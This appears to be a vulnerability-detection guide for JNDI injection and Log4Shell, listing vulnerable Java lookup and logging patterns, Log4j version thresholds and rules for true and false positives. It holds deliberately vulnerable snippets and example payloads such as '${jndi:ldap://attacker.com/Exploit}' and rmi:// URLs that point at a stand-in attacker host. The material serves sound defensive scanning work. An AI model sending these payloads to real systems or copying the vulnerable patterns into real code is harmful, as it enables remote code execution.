---
name: jndi_injection
description: JNDI injection detection — vulnerable code patterns where user input reaches JNDI lookup calls enabling RCE via LDAP/RMI object loading (Log4Shell and beyond)
---

# JNDI Injection

JNDI (Java Naming and Directory Interface) injection occurs when user-controlled input reaches a `InitialContext.lookup()` call or equivalent, allowing an attacker to load a remote Java object from an LDAP or RMI server they control, resulting in Remote Code Execution.

## CWE Classification

- **CWE-74**: Improper Neutralization of Special Elements in Output Used by a Downstream Component (parent)
- **CWE-917**: Improper Neutralization of Special Elements used in an Expression Language Statement (JNDI lookup injection)
- **CWE-502**: Deserialization of Untrusted Data (remote class/object loading via JNDI)
- **CWE-918**: Server-Side Request Forgery (when used to reach internal services)

## Source → Sink Pattern

**Sources**: HTTP parameters, headers (`User-Agent`, `X-Forwarded-For`, `Referer`, `X-Api-Version`), request body, log messages that include user data

**Sinks**:
- `new InitialContext().lookup(userInput)`
- `context.lookup(userInput)` — any `javax.naming.Context`
- `jndiTemplate.lookup(userInput, ...)`
- Logging frameworks that perform JNDI lookups on `${jndi:...}` patterns in log messages

## Vulnerable Code Patterns

### Direct JNDI Lookup

```java
// VULNERABLE: user input used as JNDI resource name
String datasource = request.getParameter("ds");
Context ctx = new InitialContext();
DataSource ds = (DataSource) ctx.lookup(datasource);
// attacker passes: ldap://attacker.com/Exploit → loads remote class → RCE

// VULNERABLE: lookup with concatenated user-controlled path
String userGroup = request.getParameter("group");
Object obj = new InitialContext().lookup("ldap://internal-server/" + userGroup);

// VULNERABLE: Spring JndiTemplate wrapping user input
JndiTemplate jndiTemplate = new JndiTemplate();
Object resource = jndiTemplate.lookup(request.getParameter("resource"));
```

**VULN indicator**: Any `Context.lookup(...)` call where the lookup name is fully or partially controlled by external input.

### Log4Shell (CVE-2021-44228) — Logging Framework Pattern

```java
// VULNERABLE: Log4j2 logging of user-controlled data triggers JNDI lookup
// in Log4j2 versions < 2.15.0 (or < 2.17.0 for some bypass vectors)
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

Logger logger = LogManager.getLogger(MyClass.class);

// Any of these patterns is VULNERABLE if the logged value contains ${jndi:...}:
logger.info("User-Agent: {}", request.getHeader("User-Agent"));
logger.error("Login failed for: " + request.getParameter("username"));
logger.warn("Request path: {}", request.getRequestURI());

// Attacker sends: User-Agent: ${jndi:ldap://attacker.com/Exploit}
// Log4j2 interpolates the ${jndi:...} expression → JNDI lookup → RCE
```

**VULN condition for Log4Shell**:
1. `log4j-core` version < 2.15.0 in `pom.xml` / `build.gradle`
2. Logger logging user-controlled data (HTTP headers, params, body, path)
3. `log4j2.formatMsgNoLookups=false` (default in vulnerable versions)

**SAFE indicators** (Log4Shell):
- `log4j-core` version >= 2.17.0 (lookups disabled by default)
- JVM arg `-Dlog4j2.formatMsgNoLookups=true`
- `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` env var
- `PatternLayout` with `%msg{nolookups}` in `log4j2.xml`

### Spring JNDI / JDBC DataSource via JNDI

```java
// VULNERABLE: Spring DataSource configured via user-influenced JNDI name
// In application.properties or user-supplied config:
// spring.datasource.jndi-name=rmi://attacker.com/Exploit
JndiDataSourceLookup lookup = new JndiDataSourceLookup();
DataSource ds = lookup.getDataSource(userSuppliedJndiName);

// VULNERABLE: JPA/Hibernate persistence unit with user-controlled JNDI
// persistence.xml: <non-jta-data-source>${userInput}</non-jta-data-source>
```

### RMI Registry Lookup

```java
// VULNERABLE: RMI lookup with user-controlled registry URL
String rmiUrl = request.getParameter("service");
Remote obj = Naming.lookup(rmiUrl);  // rmi://attacker.com/EvilObject → RCE

// VULNERABLE: Registry lookup
Registry registry = LocateRegistry.getRegistry(userHost, userPort);
Object stub = registry.lookup(userServiceName);
```

### LDAP / LDAPS Client Code

```java
// VULNERABLE: LDAP search with user-controlled attribute value (LDAP injection risk + JNDI chain)
DirContext ctx = new InitialDirContext(env);
String filter = "(uid=" + request.getParameter("user") + ")";
NamingEnumeration<?> results = ctx.search("ou=people,dc=example,dc=com", filter, controls);
// If javaSerializedData / javaClassName attributes are returned and processed, potential deserialization
```

## Detection Signals by Dependency

### Maven/Gradle — Vulnerable Log4j Versions

```xml
<!-- pom.xml — VULNERABLE versions -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>  <!-- CVE-2021-44228 -->
</dependency>
<!-- Any version < 2.17.0 is potentially vulnerable to some Log4Shell variant -->
```

**Version thresholds**:
- `< 2.15.0`: Original Log4Shell (CVE-2021-44228)
- `< 2.16.0`: Bypass (CVE-2021-45046)
- `< 2.17.0`: DoS (CVE-2021-45105)
- `< 2.17.1` / `< 2.12.4` (Java 8) / `< 2.3.2` (Java 7): RCE via configuration (CVE-2021-44832)

### Classpath Gadgets That Enable JNDI RCE

When JNDI lookup loads a remote class, execution occurs in the JVM. The following libraries extend impact:
- `commons-collections` (any version)
- `spring-beans` / `spring-core`
- `org.codehaus.groovy:groovy`
- `bsh:bsh` (BeanShell)

Their presence on the classpath combined with `InitialContext.lookup(userInput)` = **CRITICAL**.

## Java Source Detection Rules

### TRUE POSITIVE

- `new InitialContext().lookup(userInput)` where `userInput` is any HTTP request value → **CONFIRM** (JNDI injection / SSRF / potential RCE)
- `Context.lookup(url)` where `url` contains `ldap://`, `rmi://`, `dns://`, `corba://`, or `iiop://` prefix coming from request data → **CONFIRM**
- Log4j-core < 2.15.0 + `logger.info/warn/error/debug(...)` logging any user-controlled string → **CONFIRM** (Log4Shell)
- `JndiTemplate.lookup(request.getParameter(...))` → **CONFIRM**

### FALSE POSITIVE

- `Context.lookup("java:comp/env/jdbc/MyDS")` — fully hardcoded JNDI name, no user input → **NOT JNDI injection**
- `InitialContext.lookup(appConfig.getJndiName())` — name from server config, not user input → **NOT JNDI injection**
- Log4j-core >= 2.17.0 with `formatMsgNoLookups` or `noConsoleNoAnsi` patterns → **SAFE** (lookups disabled)
- Log4j1.x — does NOT support `${jndi:...}` lookup syntax (Log4Shell is Log4j2 only)

## JNDI Lookup URL Schemes to Flag

Any user-controlled string that could contain:
- `ldap://` or `ldaps://` — LDAP/LDAPS object factory loading
- `rmi://` — Java RMI object loading
- `dns://` — DNS resolution (information disclosure)
- `corba://` or `iiop://` — CORBA/IIOP object loading
- `jndi:ldap://`, `${jndi:...}` — Log4Shell interpolation pattern

## Severity

| Pattern | Severity |
|---------|----------|
| Direct `InitialContext.lookup(userInput)` | Critical |
| Log4Shell: log4j2 < 2.15.0 logging user HTTP headers/params | Critical |
| RMI `Naming.lookup(userInput)` | Critical |
| LDAP search filter injection (without object loading) | High |
| DNS-only JNDI lookup (information disclosure) | Medium |
- FALSE POSITIVE guard: `log4j`, `fastjson`, or similar component demos are not `jndi_injection` unless untrusted data reaches an actual JNDI lookup sink such as `InitialContext.lookup`, `${jndi:...}`, or equivalent runtime resolution.
